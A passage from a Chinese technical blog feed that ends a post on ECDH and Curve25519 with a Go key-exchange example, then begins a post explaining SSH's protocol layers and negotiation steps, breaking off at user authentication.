<h4 id="ECDH"><a href="#ECDH" class="headerlink" title="ECDH"></a>ECDH</h4><p>全称是<code>Elliptic Curve Diffie-Hellman</code>, 是DH算法的加强版, 基于椭圆曲线难题加密, 现在是主流的密钥交换算法。<br>ECC是建立在基于椭圆曲线的离散对数的难度, 大概过程如下:</p>
<blockquote>
<p>给定椭圆曲线上的一个点P，一个整数k，求解Q=kP很容易；给定一个点P、Q，知道Q=kP，求整数k确是一个难题。ECDH即建立在此数学难题之上</p>
</blockquote>
<p>椭圆曲线算法因参数不同有多种类型, 这个网站列出了现阶段那些ECC是相对安全的:<a href="http://safecurves.cr.yp.to/" target="_blank" rel="external">椭圆曲线算法安全列表</a>, 而curve25519便是其中的佼佼者。<br>Curve25519/Ed25519/X25519是著名密码学家Daniel J. Bernstein在2006年独立设计的椭圆曲线加密/签名/密钥交换算法, 和现有的任何椭圆曲线算法都完全独立。<br>特点是：</p>
<ul>
<li>完全开放设计: 算法各参数的选择直截了当，非常明确，没有任何可疑之处，相比之下目前广泛使用的椭圆曲线是NIST系列标准，方程的系数是使用来历不明的随机种子 c49d3608 86e70493 6a6678e1 139d26b7 819f7e90 生成的，非常可疑，疑似后门；</li>
<li>高安全性： 一个椭圆曲线加密算法就算在数学上是安全的，在实用上也并不一定安全，有很大的概率通过缓存、时间、恶意输入摧毁安全性，而25519系列椭圆曲线经过特别设计，尽可能的将出错的概率降到了最低，可以说是实践上最安全的加密算法。例如，任何一个32位随机数都是一个合法的X25519公钥，因此通过恶意数值攻击是不可能的，算法在设计的时候刻意避免的某些分支操作，这样在编程的时候可以不使用if ，减少了不同if分支代码执行时间不同的时序攻击概率，相反， NIST系列椭圆曲线算法在实际应用中出错的可能性非常大，而且对于某些理论攻击的免疫能力不高， Bernstein 对市面上所有的加密算法使用12个标准进行了考察， 25519是几乎唯一满足这些标准的 <a href="http://t.cn/RMGmi1g" target="_blank" rel="external">http://t.cn/RMGmi1g</a> ；</li>
<li>速度快: 25519系列曲线是目前最快的椭圆曲线加密算法，性能远远超过NIST系列，而且具有比P-256更高的安全性；</li>
<li>作者功底深厚: Daniel J. Bernstein是世界著名的密码学家，他在大学曾经开设过一门 UNIX 系统安全的课程给学生，结果一学期下来，发现了 UNIX 程序中的 91 个安全漏洞；他早年在美国依然禁止出口加密算法时，曾因为把自己设计的加密算法发布到网上遭到了美国政府的起诉，他本人抗争六年，最后美国政府撤销所有指控，目前另一个非常火的高性能安全流密码 ChaCha20 也是出自 Bernstein 之手；</li>
<li>下一代的标准: 25519系列曲线自2006年发表以来，除了学术界无人问津， 2013 年爱德华·斯诺登曝光棱镜计划后，该算法突然大火，大量软件，如OpenSSH都迅速增加了对25519系列的支持，如今25519已经是大势所趋，可疑的NIST曲线迟早要退出椭圆曲线的历史舞台，目前， RFC增加了SSL/TLS对X25519密钥交换协议的支持，而新版 OpenSSL 1.1也加入支持，是摆脱老大哥的第一步，下一步是将 Ed25519做为可选的TLS证书签名算法，彻底摆脱NIST</li>
</ul>
<h4 id="代码示例-3"><a href="#代码示例-3" class="headerlink" title="代码示例"></a>代码示例</h4><p>这里需要指出下golang的标准库的crypto里的椭圆曲线实现了这4种(<a href="https://golang.org/pkg/crypto/elliptic/" target="_blank" rel="external">elliptic文档</a>): P224/P256/P384/P521, 而curve25519是单独实现的, 他不在标准库中: golang.org/x/crypto/curve25519<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"crypto"</span></div><div class="line">	<span class="string">"crypto/elliptic"</span></div><div class="line">	<span class="string">"crypto/rand"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"io"</span></div><div class="line">	<span class="string">"math/big"</span></div><div class="line"></div><div class="line">	<span class="string">"golang.org/x/crypto/curve25519"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="comment">// ECDH 秘钥交换算法的主接口</span></div><div class="line"><span class="keyword">type</span> ECDH <span class="keyword">interface</span> &#123;</div><div class="line">	GenerateKey(io.Reader) (crypto.PrivateKey, crypto.PublicKey, error)</div><div class="line">	Marshal(crypto.PublicKey) []<span class="keyword">byte</span></div><div class="line">	Unmarshal([]<span class="keyword">byte</span>) (crypto.PublicKey, <span class="keyword">bool</span>)</div><div class="line">	GenerateSharedSecret(crypto.PrivateKey, crypto.PublicKey) ([]<span class="keyword">byte</span>, error)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> ellipticECDH <span class="keyword">struct</span> &#123;</div><div class="line">	ECDH</div><div class="line">	curve elliptic.Curve</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> ellipticPublicKey <span class="keyword">struct</span> &#123;</div><div class="line">	elliptic.Curve</div><div class="line">	X, Y *big.Int</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> ellipticPrivateKey <span class="keyword">struct</span> &#123;</div><div class="line">	D []<span class="keyword">byte</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// NewEllipticECDH 指定一种椭圆曲线算法用于创建一个ECDH的实例</span></div><div class="line"><span class="comment">// 关于椭圆曲线算法标准库里面实现了4种: 见crypto/elliptic</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewEllipticECDH</span><span class="params">(curve elliptic.Curve)</span> <span class="title">ECDH</span></span> &#123;</div><div class="line">	<span class="keyword">return</span> &amp;ellipticECDH&#123;</div><div class="line">		curve: curve,</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// GenerateKey 基于标准库的NIST椭圆曲线算法生成秘钥对</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *ellipticECDH)</span> <span class="title">GenerateKey</span><span class="params">(rand io.Reader)</span> <span class="params">(crypto.PrivateKey, crypto.PublicKey, error)</span></span> &#123;</div><div class="line">	<span class="keyword">var</span> d []<span class="keyword">byte</span></div><div class="line">	<span class="keyword">var</span> x, y *big.Int</div><div class="line">	<span class="keyword">var</span> priv *ellipticPrivateKey</div><div class="line">	<span class="keyword">var</span> pub *ellipticPublicKey</div><div class="line">	<span class="keyword">var</span> err error</div><div class="line"></div><div class="line">	d, x, y, err = elliptic.GenerateKey(e.curve, rand)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	priv = &amp;ellipticPrivateKey&#123;</div><div class="line">		D: d,</div><div class="line">	&#125;</div><div class="line">	pub = &amp;ellipticPublicKey&#123;</div><div class="line">		Curve: e.curve,</div><div class="line">		X:     x,</div><div class="line">		Y:     y,</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> priv, pub, <span class="literal">nil</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Marshal用于公钥的序列化</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *ellipticECDH)</span> <span class="title">Marshal</span><span class="params">(p crypto.PublicKey)</span> []<span class="title">byte</span></span> &#123;</div><div class="line">	pub := p.(*ellipticPublicKey)</div><div class="line">	<span class="keyword">return</span> elliptic.Marshal(e.curve, pub.X, pub.Y)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Unmarshal用于公钥的反序列化</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *ellipticECDH)</span> <span class="title">Unmarshal</span><span class="params">(data []<span class="keyword">byte</span>)</span> <span class="params">(crypto.PublicKey, <span class="keyword">bool</span>)</span></span> &#123;</div><div class="line">	<span class="keyword">var</span> key *ellipticPublicKey</div><div class="line">	<span class="keyword">var</span> x, y *big.Int</div><div class="line"></div><div class="line">	x, y = elliptic.Unmarshal(e.curve, data)</div><div class="line">	<span class="keyword">if</span> x == <span class="literal">nil</span> || y == <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> key, <span class="literal">false</span></div><div class="line">	&#125;</div><div class="line">	key = &amp;ellipticPublicKey&#123;</div><div class="line">		Curve: e.curve,</div><div class="line">		X:     x,</div><div class="line">		Y:     y,</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> key, <span class="literal">true</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// GenerateSharedSecret 通过自己的私钥和对方的公钥协商一个共享密码</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *ellipticECDH)</span> <span class="title">GenerateSharedSecret</span><span class="params">(privKey crypto.PrivateKey, pubKey crypto.PublicKey)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> &#123;</div><div class="line">	priv := privKey.(*ellipticPrivateKey)</div><div class="line">	pub := pubKey.(*ellipticPublicKey)</div><div class="line"></div><div class="line">	x, _ := e.curve.ScalarMult(pub.X, pub.Y, priv.D)</div><div class="line">	<span class="keyword">return</span> x.Bytes(), <span class="literal">nil</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// NewCurve25519ECDH 使用密码学家Daniel J. Bernstein的椭圆曲线算法:Curve25519来创建ECDH实例</span></div><div class="line"><span class="comment">// 因为Curve25519独立于NIST之外, 没在标准库实现, 需要单独为期实现一套接口来支持ECDH</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewCurve25519ECDH</span><span class="params">()</span> <span class="title">ECDH</span></span> &#123;</div><div class="line">	<span class="keyword">return</span> &amp;curve25519ECDH&#123;&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> curve25519ECDH <span class="keyword">struct</span> &#123;</div><div class="line">	ECDH</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// GenerateKey 基于curve25519椭圆曲线算法生成秘钥对</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *curve25519ECDH)</span> <span class="title">GenerateKey</span><span class="params">(rand io.Reader)</span> <span class="params">(crypto.PrivateKey, crypto.PublicKey, error)</span></span> &#123;</div><div class="line">	<span class="keyword">var</span> pub, priv [<span class="number">32</span>]<span class="keyword">byte</span></div><div class="line">	<span class="keyword">var</span> err error</div><div class="line"></div><div class="line">	_, err = io.ReadFull(rand, priv[:])</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	priv[<span class="number">0</span>] &amp;= <span class="number">248</span></div><div class="line">	priv[<span class="number">31</span>] &amp;= <span class="number">127</span></div><div class="line">	priv[<span class="number">31</span>] |= <span class="number">64</span></div><div class="line"></div><div class="line">	curve25519.ScalarBaseMult(&amp;pub, &amp;priv)</div><div class="line"></div><div class="line">	<span class="keyword">return</span> &amp;priv, &amp;pub, <span class="literal">nil</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 实现公钥的序列化</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *curve25519ECDH)</span> <span class="title">Marshal</span><span class="params">(p crypto.PublicKey)</span> []<span class="title">byte</span></span> &#123;</div><div class="line">	pub := p.(*[<span class="number">32</span>]<span class="keyword">byte</span>)</div><div class="line">	<span class="keyword">return</span> pub[:]</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 实现公钥的反序列化</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *curve25519ECDH)</span> <span class="title">Unmarshal</span><span class="params">(data []<span class="keyword">byte</span>)</span> <span class="params">(crypto.PublicKey, <span class="keyword">bool</span>)</span></span> &#123;</div><div class="line">	<span class="keyword">var</span> pub [<span class="number">32</span>]<span class="keyword">byte</span></div><div class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(data) != <span class="number">32</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">false</span></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="built_in">copy</span>(pub[:], data)</div><div class="line">	<span class="keyword">return</span> &amp;pub, <span class="literal">true</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 实现秘钥协商接口</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *curve25519ECDH)</span> <span class="title">GenerateSharedSecret</span><span class="params">(privKey crypto.PrivateKey, pubKey crypto.PublicKey)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> &#123;</div><div class="line">	<span class="keyword">var</span> priv, pub, secret *[<span class="number">32</span>]<span class="keyword">byte</span></div><div class="line"></div><div class="line">	priv = privKey.(*[<span class="number">32</span>]<span class="keyword">byte</span>)</div><div class="line">	pub = pubKey.(*[<span class="number">32</span>]<span class="keyword">byte</span>)</div><div class="line">	secret = <span class="built_in">new</span>([<span class="number">32</span>]<span class="keyword">byte</span>)</div><div class="line"></div><div class="line">	curve25519.ScalarMult(secret, priv, pub)</div><div class="line">	<span class="keyword">return</span> secret[:], <span class="literal">nil</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">(e ECDH)</span></span> &#123;</div><div class="line">	<span class="keyword">var</span> privKey1, privKey2 crypto.PrivateKey</div><div class="line">	<span class="keyword">var</span> pubKey1, pubKey2 crypto.PublicKey</div><div class="line">	<span class="keyword">var</span> pubKey1Buf, pubKey2Buf []<span class="keyword">byte</span></div><div class="line">	<span class="keyword">var</span> err error</div><div class="line">	<span class="keyword">var</span> ok <span class="keyword">bool</span></div><div class="line">	<span class="keyword">var</span> secret1, secret2 []<span class="keyword">byte</span></div><div class="line"></div><div class="line">	<span class="comment">// 准备2对秘钥对,A: privKey1,pubKey1 B:privKey2,pubKey2</span></div><div class="line">	privKey1, pubKey1, err = e.GenerateKey(rand.Reader)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(err)</div><div class="line">	&#125;</div><div class="line">	privKey2, pubKey2, err = e.GenerateKey(rand.Reader)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(err)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	pubKey1Buf = e.Marshal(pubKey1)</div><div class="line">	pubKey2Buf = e.Marshal(pubKey2)</div><div class="line"></div><div class="line">	pubKey1, ok = e.Unmarshal(pubKey1Buf)</div><div class="line">	<span class="keyword">if</span> !ok &#123;</div><div class="line">		fmt.Println(<span class="string">"Unmarshal does not work"</span>)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	pubKey2, ok = e.Unmarshal(pubKey2Buf)</div><div class="line">	<span class="keyword">if</span> !ok &#123;</div><div class="line">		fmt.Println(<span class="string">"Unmarshal does not work"</span>)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// A 通过B给的公钥协商共享密码</span></div><div class="line">	secret1, err = e.GenerateSharedSecret(privKey1, pubKey2)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(err)</div><div class="line">	&#125;</div><div class="line">	<span class="comment">// B 通过A给的公钥协商共享密码</span></div><div class="line">	secret2, err = e.GenerateSharedSecret(privKey2, pubKey1)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(err)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// A B在没暴露直接的私钥的情况下, 协商出了一个共享密码</span></div><div class="line">	fmt.Printf(<span class="string">"The secret1 shared keys: %x\n"</span>, secret1)</div><div class="line">	fmt.Printf(<span class="string">"The secret2 shared keys: %x\n"</span>, secret2)</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	e1 := NewEllipticECDH(elliptic.P521())</div><div class="line">	e2 := NewCurve25519ECDH()</div><div class="line">	test(e1)</div><div class="line">	test(e2)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="总体结论"><a href="#总体结论" class="headerlink" title="总体结论"></a>总体结论</h3><p>以上综述了两种加密方法的原理，总体来说主要有下面几个方面的不同：</p>
<ul>
<li>管理方面：公钥密码算法只需要较少的资源就可以实现目的，在密钥的分配上，两者之间相差一个指数级别（一个是n一个是n2）。所以私钥密码算法不适应广域网的使用，而且更重要的一点是它不支持数字签名。</li>
<li>安全方面：由于公钥密码算法基于未解决的数学难题，在破解上几乎不可能。对于私钥密码算法，到了AES虽说从理论来说是不可能破解的，但从计算机的发展角度来看。公钥更具有优越性。</li>
<li>速度上来看：AES的软件实现速度已经达到了每秒数兆或数十兆比特。是公钥的100倍，如果用硬件来实现的话这个比值将扩大到1000倍。</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;据记载，公元前400年，古希腊人发明了置换密码。1881年世界上的第一个电话保密专利出现。在第二次世界大战期间，德国军方启用“恩尼格玛”密码机，密码学在战争中起着非常重要的作用, 这段历史很有趣,建议看看&lt;a href=&quot;https://www.zhihu.com/question/28397034&quot;&gt;恩格玛机破解历史&lt;/a&gt;。&lt;br&gt;随着信息化和数字化社会的发展，人们对信息安全和保密的重要性认识不断提高，于是在1997年，美国国家标准局公布实施了“美国数据加密标准（DES）”，民间力量开始全面介入密码学的研究和应用中，采用的加密算法有DES、RSA、SHA等。随着对加密强度需求的不断提高，近期又出现了AES、ECC等。&lt;br&gt;
    
    </summary>
    
      <category term="开发语言" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/"/>
    
      <category term="Golang" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/Golang/"/>
    
    
      <category term="crypto" scheme="https://blog.yumaojun.net/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>跳板机系列(二)-ssh协议原理简介</title>
    <link href="https://blog.yumaojun.net/2017/02/16/ssh-protocol/"/>
    <id>https://blog.yumaojun.net/2017/02/16/ssh-protocol/</id>
    <published>2017-02-16T02:09:31.000Z</published>
    <updated>2017-02-22T15:24:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>SSH对于大多数人来说应该并不陌生, 无论你是开发还是测试还是运维, 只要你需要登录类Unix服务器都会用到, 他被用来提供链接的安全保障, 比如常见的客户端有命令行工具ssh, 以及周边的商业工具Xshell等。在这篇文章里我们不会教你如何使用xshell, 而是从协议层面全新的认识下ssh。<br><a id="more"></a></p>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>虽然SSH使用起来很简单, 但是背后的原理特别不简单,关于以下问题, 你能否知晓其细节:</p>
<ul>
<li>SSH如何保证客户端与服务端通行的安全</li>
<li>SSH采用什么加密协议</li>
<li>SSH是通过对称加密还是非对称加密数据在传输过程的安全</li>
<li>SSH如何保证数据完整性</li>
<li>SSH的密码认证方式和密钥认证方式分别如何实现，有何差异</li>
</ul>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SSH(Secure Shell)是一个提供数据通信安全、远程登录、远程指令执行等功能的安全网络协议，由芬兰赫尔辛基大学研究员Tatu Ylönen,于1995年提出，其目的是用于替代非安全的Telnet、rsh、rexec等远程Shell协议。之后SSH发展了两个大版本SSH-1和SSH-2, 开源实现OpenSSH对2者都支持。<br>SSH的主要特性:</p>
<ul>
<li>加密: 避免数据内容泄漏</li>
<li>通信的完整性: 避免数据被篡改，以及发送或接受地址伪装(检查数据是否被篡改，数据是否来自发送者而非攻击者） SSH-2通过MD5和SHA-1实现该功能，SSH-1使用CRC-32</li>
<li>认证: 识别数据发送者和接收者身份 客户端验证SSH服务端的身份：防止攻击者仿冒SSH服务端身份，避免中介人攻击和重定向请求的攻击；OpenSSH通过在know-hosts中存储主机名和host key对服务端身份进行认证 服务端验证请求者身份：提供安全性较弱的用户密码方式，和安全性更强的per-user public-key signatures；此外SSH还支持与第三方安全服务系统的集成，如Kerberos等</li>
<li>授权: 用户访问控制</li>
<li>安全隧道: 转发或者为基于TCP/IP的回话提供加密隧道, 比如通过SSH为Telnet、FTP等提供通信安全保障，支持三种类型的Forwarding操作：Port Forwarding；X Forwarding；Agent Forwarding</li>
</ul>
<p>通过使用SSH，你可以把所有传输的数据进行加密，这样”中间人”这种攻击方式就不可能实现了，而且也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替Telnet，又可以为FTP、PoP、甚至为PPP提供一个安全的”通道”。</p>
<h2 id="安全相关"><a href="#安全相关" class="headerlink" title="安全相关"></a>安全相关</h2><p>在SSH中涉及到很多加密算法, 关于加密算法的相关知识之前已经写过一遍博客做专门介绍:<a href="/2017/02/19/go-crypto/" title="密码学简介与Golang的加密库Crypto的使用">密码学简介与Golang的加密库Crypto的使用</a>, 以下是一个总结性的描述:</p>
<ul>
<li>对称加密: 高效，但安全性相对较低，Key的分发尤其不方便, 主要用于数据传输的加密(session加密), 常用AES系列</li>
<li>非对称加密: 安全，但效率低，不适合大规模进行数据的加密和解密操作, 主要用于秘钥交换算法过程中用来协商Key和在数字签名时用来验证身份, 常用的是RSA/ECDSA</li>
<li>秘钥交换算法: 用于协商对称加密的密码, ECDH用的比较多</li>
<li>散列算法: 用于确保数据传输过程中的完整性, 为了安全一般使用Hmac<br>在golang的ssh包中使用ECDH的cure25519的进行密码的交换, 交换后的密码使用AES来加密数据. 如果使用密钥登录的话,一般使用ECDSA进行数字签名.</li>
</ul>
<h2 id="协议组成"><a href="#协议组成" class="headerlink" title="协议组成"></a>协议组成</h2><p><img src="http://oiw1gzfww.bkt.clouddn.com/ssh-portocol.gif" alt=""><br>从上图中可以看出SSH主要有三部分组成: 传输层协议, 用户认证协议, 连接协议</p>
<h3 id="传输层协议-SSH-TRANS"><a href="#传输层协议-SSH-TRANS" class="headerlink" title="传输层协议[SSH-TRANS]"></a>传输层协议[SSH-TRANS]</h3><p>也叫:The Transport Layer Protocol, 提供了服务器认证，保密性及完整性。此外它有时还提供压缩功能。 SSH-TRANS通常运行在TCP/IP连接上，也可能用于其它可靠数据流上。 SSH-TRANS提供了强力的加密技术、密码主机认证及完整性保护。该协议中的认证基于主机，并且该协议不执行用户认证。更高层的用户认证协议可以设计为在此协议之上。</p>
<h3 id="用户认证协议-SSH-USERAUTH"><a href="#用户认证协议-SSH-USERAUTH" class="headerlink" title="用户认证协议[SSH-USERAUTH]"></a>用户认证协议[SSH-USERAUTH]</h3><p>也叫:The User Authentication Protocol,  用于向服务器提供客户端用户鉴别功能。它运行在传输层协议SSH-TRANS上面。当SSH-USERAUTH开始后，它从低层协议那里接收会话标识符(从第一次密钥交换中的交换哈希H). 会话标识符唯一标识此会话并且适用于标记以证明私钥的所有权。 SSH-USERAUTH也需要知道低层协议是否提供保密性保护。</p>
<h3 id="连接协议-SSH-CONNECT"><a href="#连接协议-SSH-CONNECT" class="headerlink" title="连接协议[SSH-CONNECT]"></a>连接协议[SSH-CONNECT]</h3><p>也叫: The Connection Protocol, 将多个加密隧道分成逻辑通道。它运行在用户认证协议上。它提供了交互式登录话路、远程命令执行、转发TCP/IP连接和转发X11连接。各种高层应用协议可以相对地独立于SSH基本体系之外，并依靠这个基本框架，通过连接协议使用SSH的安全机制。</p>
<h2 id="工作过程"><a href="#工作过程" class="headerlink" title="工作过程"></a>工作过程</h2><p><img src="http://oiw1gzfww.bkt.clouddn.com/ssh-auth.png" alt=""><br>这张图描述了ssh交换的整个过程: </p>
<ol>
<li>Client端向Server端发起SSH连接请求。</li>
<li>Server端向Client端发起版本协商。</li>
<li>协商结束后Server端发送Host Key公钥 Server Key公钥，随机数等信息。到这里所有通信是不加密的。</li>
<li>Client端返回确认信息，同时附带用公钥加密过的一个随机数，用于双方计算Session Key。</li>
<li>进入认证阶段。从此以后所有通信均加密。</li>
<li>认证成功后，进入交互阶段。</li>
</ol>
<p>针对这项阶段发生在协成的那一部分有一个简单的总结: 发生在传输层的: 版本协商和算法协商. 发生在用户认证层的: 用户认证. 发生在链接层的: 回话交互</p>
<h3 id="版本协商"><a href="#版本协商" class="headerlink" title="版本协商"></a>版本协商</h3><ol>
<li>服务器监听22端口，等待客户端连接。</li>
<li>客户端向服务器端发起TCP初始连接请求，TCP连接建立后，服务器向客户端发送第一个报文，包括版本标志字符串，格式为“SSH－&lt;主协议版本号&gt;.&lt;次协议版本号&gt;－&lt;软件版本号&gt;”，协议版本号由主版本号和次版本号组成，软件版本号主要是为调试使用。</li>
<li>客户端收到报文后，解析该数据包，如果服务器端的协议版本号比自己的低，且客户端能支持服务器端的低版本，就使用服务器端的低版本协议号，否则使用自己的协议版本号。</li>
<li>客户端回应服务器一个报文，包含了客户端决定使用的协议版本号。服务器比较客户端发来的版本号，决定是否能同客户端一起工作。</li>
<li>如果协商成功，则进入密钥和算法协商阶段，否则服务器端断开TCP连接。</li>
</ol>
<p>因为版本协商发生在为加密之前, 所以版本协商是明文的</p>
<h3 id="算法协商"><a href="#算法协商" class="headerlink" title="算法协商"></a>算法协商</h3><ol>
<li>服务器端和客户端分别发送算法协商报文给对端，报文中包含自己支持的公钥算法列表、加密算法列表、MAC(Message Authentication Code，消息验证码)算法列表、压缩算法列表等;</li>
<li>服务器端和客户端根据对端和本端支持的算法列表得出最终使用的算法。</li>
<li>服务器端和客户端利用ECDH交换算法、主机密钥对等参数，生成会话密钥和会话ID。</li>
</ol>
<p>通过以上步骤，服务器端和客户端就取得了相同的会话密钥和会话ID, 用于加密传输的数据, 到此链接加密完成。</p>
<h3 id="用户认证"><a href="#用户认证" class="headerlink" title="用户认证"></a>用户认证</h3><ol>
